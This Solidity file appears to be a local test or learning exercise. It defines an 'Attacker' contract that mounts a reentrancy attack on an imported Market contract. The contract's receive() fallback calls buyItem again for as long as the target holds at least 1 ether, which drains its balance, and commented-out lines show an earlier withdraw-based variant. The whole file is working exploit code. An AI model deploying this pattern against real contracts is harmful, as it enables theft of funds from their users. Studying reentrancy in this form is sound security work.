// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./Market.sol";

contract Attacker {
    Market public contractToAttack;

    constructor(address _contractToAttackAddress) {
        contractToAttack = Market(_contractToAttackAddress);
    }

    //this is called when Market sends Ether to this contract (Attacker)
    receive() external payable {
        //comment this out to allow the withdrawal
        if (address(contractToAttack).balance >= 1 ether) {
            contractToAttack.buyItem(
                address(0x5FbDB2315678afecb367f032d93F642f64180aa3),
                0
            );
            //.withdraw();
        }
    }

    // function depositIntoAttackee() external payable {
    //     require(msg.value >= 1 ether);
    //     contractToAttack.depositIntoAttackee{value: msg.value}();
    // }

    function performAttack() external {
        //contractToAttack.withdraw();
        contractToAttack.buyItem(
            address(0x5FbDB2315678afecb367f032d93F642f64180aa3),
            0
        );
    }

    function getBalanceFromAttacker() external view returns (uint256) {
        return address(this).balance;
    }
}
